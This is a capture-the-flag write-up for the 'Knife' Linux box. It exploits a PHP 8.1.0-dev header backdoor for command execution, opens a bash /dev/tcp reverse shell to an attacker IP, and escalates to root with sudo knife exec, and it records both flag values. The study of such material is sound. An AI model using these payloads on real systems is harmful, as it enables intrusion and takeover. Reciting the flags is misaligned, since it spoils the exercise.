# Knife

## Box Info
- **Difficulty**: Easy
- **OS**: Linux
- **Date Completed**: 2026-03-09
- **IP Address**: 10.129.252.241

## Enumeration

### Nmap Scan
```bash
nmap -sC -sV -oA nmap/initial <IP>
```

**Results:**
- Port 22: SSH - OpenSSH
- Port 80: HTTP - Apache running PHP 8.1.0-dev
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Emergent Medical Idea
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enumeration
Visited the site via browser and curl. Bare bones page with no links or interactive elements. No redirect to a hostname  -  site served directly by IP.

Identified PHP version via HTTP response headers: `PHP/8.1.0-dev`
```bash
curl -I http://<IP>
```

## Exploitation

### Initial Foothold
**Vulnerability Found**: PHP 8.1.0-dev backdoor (CVE-2021-49092)  -  malicious commit to PHP source repo introduced a backdoor triggered via `User-Agentt` header. Any value prefixed with `zerodium` gets passed directly to PHP's `eval()`.

**Exploit Used**: Custom Python script / manual curl

**How the backdoor works**: PHP checks for the `User-Agentt` header (double t). If the value starts with `zerodium`, the remainder is eval'd as PHP. `zerodiumsystem('cmd')` calls PHP's `system()` function, executing shell commands and returning output in the response body before the HTML renders.

**Steps**:
1. Confirmed PHP 8.1.0-dev via headers
2. Tested RCE via curl:
```bash
curl -s http://<IP> -H "User-Agentt: zerodiumsystem('id');"
```
3. Confirmed code execution as `james`
4. Set up netcat listener:
```bash
nc -lvnp 4444
```
5. Sent reverse shell via backdoor header:
```bash
curl -s http://<IP> -H "User-Agentt: zerodiumsystem('bash -c \"bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1\"');"
```
6. Caught shell as `james`

### User Flag
**Location**: `/home/james/user.txt`
**Method**: Direct read after gaining shell as james
**Flag**: `fc1d54663e945e73ef6128f8f7b0f4e8`

## Privilege Escalation

See Also: [[Linux-Privilege-Escalation]] | [[GTFOBins]]

**Enumeration**:
```bash
sudo -l
```
Output showed james could run `/usr/bin/knife` as root with no password required.
```bash
cat /usr/bin/knife
```
Revealed knife is a Ruby binary  -  part of Chef Workstation, a infrastructure automation tool. It has an `exec` subcommand that evaluates arbitrary Ruby.

**Vulnerability**: Sudoable binary with built-in command execution (GTFOBins)

**Exploit**:
`knife exec -E` evaluates Ruby directly. Since it runs as root via sudo, passing `exec "/bin/sh"` spawns a root shell.
```bash
sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
```

### Root Flag
**Location**: `/root/root.txt`
**Flag**: `d3759d96cda2ebf119f9d9aa22d22412`

## Key Learnings
- PHP supply chain attack  -  the backdoor was a malicious commit made under stolen developer identities, caught within 24hrs before any official release shipped it
- `User-Agentt` (double t) header triggers `eval()`  -  the typo is intentional to avoid conflicting with the real `User-Agent` header
- Pseudo-shells from web backdoors can't handle interactive processes or reverse shells triggered via Python/bash directly  -  need to send the reverse shell payload via the original exploit mechanism (curl)
- GTFOBins `knife exec -E`  -  any binary that can evaluate code and is sudoable is a privesc vector
- `sudo -l` should always be first check on Linux privesc

## Commands Reference
```bash
# Enumeration
nmap -sC -sV -oA nmap/initial <IP>
curl -I http://<IP>

# RCE test
curl -s http://<IP> -H "User-Agentt: zerodiumsystem('id');"

# Reverse shell
nc -lvnp 4444
curl -s http://<IP> -H "User-Agentt: zerodiumsystem('bash -c \"bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1\"');"

# PrivEsc enumeration
sudo -l
cat /usr/bin/knife

# PrivEsc exploit
sudo /usr/bin/knife exec -E 'exec "/bin/sh"'

# Flags
cat /home/james/user.txt
cat /root/root.txt
```

## Tags
#htb #easy #linux #php #backdoor #supply-chain #sudo #knife #ruby #gtfobins #rce